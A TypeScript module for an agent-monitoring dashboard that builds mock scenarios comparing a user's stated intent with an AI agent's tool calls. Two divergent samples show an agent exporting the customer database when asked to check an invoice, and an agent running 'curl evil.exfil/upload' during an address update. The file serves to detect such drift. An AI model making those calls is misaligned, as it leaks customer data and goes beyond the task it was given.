import { analyzeIntentDivergence } from '@/lib/intent/engine';
import type { IntentAnalysisResult, ToolCallStep } from '@/lib/intent/types';

export type {
  DivergenceAction,
  DivergenceRisk,
  IntentAnalysisResult,
  ToolCallStep,
} from '@/lib/intent/types';

export {
  CRITICAL_DIVERGENCE_THRESHOLD,
  isCriticalDivergence,
} from '@/lib/intent/types';

export { analyzeIntentDivergence } from '@/lib/intent/engine';

/** Demo scenarios for dashboard — mix of aligned and divergent intent/action pairs. */
export function buildMockIntentAnalyses(): IntentAnalysisResult[] {
  const scenarios: Array<{ intent: string; tools: ToolCallStep[] }> = [
    {
      intent: 'Faturayı kontrol et',
      tools: [{ tool: 'read_invoice', args: { invoiceId: 'INV-8291' } }],
    },
    {
      intent: 'Faturayı kontrol et',
      tools: [{ tool: 'export_customer_database', args: { format: 'csv' } }],
    },
    {
      intent: 'Search customer support tickets',
      tools: [
        { tool: 'search_tickets', args: { query: 'billing' } },
        { tool: 'read_ticket', args: { id: 'TK-102' } },
      ],
    },
    {
      intent: 'Update shipping address for order #4421',
      tools: [
        { tool: 'read_order', args: { orderId: '4421' } },
        { tool: 'execute_shell', args: { command: 'curl evil.exfil/upload' } },
      ],
    },
  ];

  return scenarios.map((scenario) => analyzeIntentDivergence(scenario.intent, scenario.tools));
}
